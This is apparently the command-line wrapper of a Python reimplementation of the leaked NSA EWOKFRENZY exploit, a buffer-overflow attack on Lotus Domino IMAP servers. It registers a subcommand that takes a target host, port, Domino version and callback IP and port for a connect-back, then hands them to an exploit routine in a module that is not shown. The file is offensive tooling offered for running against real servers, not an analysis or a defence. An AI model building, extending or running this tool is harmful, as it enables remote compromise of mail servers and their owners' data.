"""ewok-frenzy — EWOKFRENZY Lotus Domino IMAP 远程利用。

Python 重写的 NSA Ewokfrenzy 工具 `Ewokfrenzy-2.0.0.exe`
(C++ / DAVE framework)，通过 IDA Pro / x32dbg 逆向恢复。
实现了该工具的 key=value 参数接口及其 Lotus Domino IMAP 利用流程。
"""

from . import ewok_frenzy


# ---------------------------------------------------------------------------
# Subcommand entrypoint.
# ---------------------------------------------------------------------------
def ewok_frenzy_handle(args):
    """Run the EWOKFRENZY exploitation sequence against the supplied host."""
    return ewok_frenzy.run_function(
        target=args.target,
        port=args.port,
        timeout=args.timeout,
        domino_version=args.domino_version,
        callback_ip=args.callback_ip,
        callback_port=args.callback_port,
        callback_local_port=args.callback_local_port,
        verbose=args.verbose,
    )


def reg_subparser(subparsers):
    """Register the `ewok-frenzy` subcommand on an argparse subparsers group."""
    p = subparsers.add_parser(
        "ewok-frenzy",
        help="EWOKFRENZY Lotus Domino IMAP 远程利用",
        description="Python 重写的 NSA Ewokfrenzy (EWOKFRENZY) Lotus Domino IMAP "
                    "远程利用工具 Ewokfrenzy-2.0.0。针对 Lotus Domino IMAP 服务器，"
                    "执行缓冲区溢出利用。",
    )
    p.add_argument(
        "target", metavar="TARGET",
        help="目标主机名或 IP",
    )
    p.add_argument(
        "-p", "--port", type=int, default=143,
        help="目标 IMAP 端口（默认 143）",
    )
    p.add_argument(
        "--timeout", type=int, default=60,
        help="阻塞网络调用超时秒（-1 表示无超时，默认 60）",
    )
    p.add_argument(
        "--domino-version",
        choices=["6.5.4", "7.0.2"],
        default="7.0.2",
        help="目标 Lotus Domino 版本（默认 7.0.2）",
    )
    p.add_argument(
        "--callback-ip", metavar="IP",
        help="Callback 模式：目标连回的 IP 地址",
    )
    p.add_argument(
        "--callback-port", type=int, metavar="PORT",
        help="Callback 模式：目标连回的端口",
    )
    p.add_argument(
        "--callback-local-port", type=int, metavar="PORT",
        help="Callback 模式：本地监听端口",
    )
    p.add_argument(
        "-v", "--verbose", action="store_true",
        help="输出参数与调试信息",
    )
    p.set_defaults(func=ewok_frenzy_handle)
